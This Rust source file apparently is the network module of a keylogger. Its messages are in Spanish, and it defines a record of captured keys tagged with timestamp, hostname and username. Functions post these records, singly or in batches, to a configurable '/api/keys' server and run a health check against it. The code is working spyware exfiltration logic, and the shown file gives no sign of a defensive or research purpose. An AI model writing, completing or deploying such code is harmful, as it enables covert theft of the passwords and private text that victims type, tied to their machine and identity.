// src/api.rs
use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeyData {
    pub timestamp: String,
    pub key: String,
    pub machine_id: String,
    pub user: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ApiResponse {
    pub success: bool,
    pub message: Option<String>,
    pub keys_received: Option<usize>,
}

#[derive(Clone)]
pub struct ApiConfig {
    pub base_url: String,
    pub endpoint: String,
    pub api_key: Option<String>,
    pub timeout_seconds: u64,
}

impl Default for ApiConfig {
    fn default() -> Self {
        Self {
            base_url: "http://localhost:8080".to_string(),
            endpoint: "/api/keys".to_string(),
            api_key: None,
            timeout_seconds: 30,
        }
    }
}

pub struct ApiClient {
    config: ApiConfig,
    client: Client,
}

impl ApiClient {
    pub fn new(config: ApiConfig) -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(config.timeout_seconds))
            .build()
            .expect("Error al crear cliente HTTP");

        Self { config, client }
    }

    pub fn send_key(&self, key_data: KeyData) -> Result<ApiResponse, Box<dyn std::error::Error>> {
        let url = format!("{}{}", self.config.base_url, self.config.endpoint);

        let mut request = self.client.post(&url)
            .json(&key_data);

        if let Some(key) = &self.config.api_key {
            request = request.header("X-API-Key", key);
        }

        let response = request.send()?;

        if response.status().is_success() {
            let api_response: ApiResponse = response.json()?;
            Ok(api_response)
        } else {
            Err(format!("Error HTTP: {}", response.status()).into())
        }
    }

    pub fn send_keys_batch(&self, keys: Vec<KeyData>) -> Result<ApiResponse, Box<dyn std::error::Error>> {
        if keys.is_empty() {
            return Ok(ApiResponse {
                success: true,
                message: Some("No hay teclas para enviar".to_string()),
                keys_received: Some(0),
            });
        }

        let url = format!("{}{}/batch", self.config.base_url, self.config.endpoint);

        let mut request = self.client.post(&url)
            .json(&keys);

        if let Some(key) = &self.config.api_key {
            request = request.header("X-API-Key", key);
        }

        let response = request.send()?;

        if response.status().is_success() {
            let api_response: ApiResponse = response.json()?;
            Ok(api_response)
        } else {
            Err(format!("Error HTTP: {}", response.status()).into())
        }
    }

    pub fn health_check(&self) -> Result<bool, Box<dyn std::error::Error>> {
        let url = format!("{}/health", self.config.base_url);
        let response = self.client.get(&url).send()?;
        Ok(response.status().is_success())
    }

    pub fn get_machine_info() -> (String, String) {
        let machine_id = Self::get_machine_id();
        let user = Self::get_username();
        (machine_id, user)
    }

    fn get_machine_id() -> String {
        #[cfg(target_os = "windows")]
        {
            if let Ok(hostname) = std::env::var("COMPUTERNAME") {
                return hostname;
            }
        }

        #[cfg(any(target_os = "linux", target_os = "macos"))]
        {
            if let Ok(hostname) = std::env::var("HOSTNAME") {
                return hostname;
            }
        }

        if let Ok(hostname) = hostname::get() {
            return hostname.to_string_lossy().to_string();
        }

        "unknown-machine".to_string()
    }

    fn get_username() -> String {
        std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown-user".to_string())
    }
}
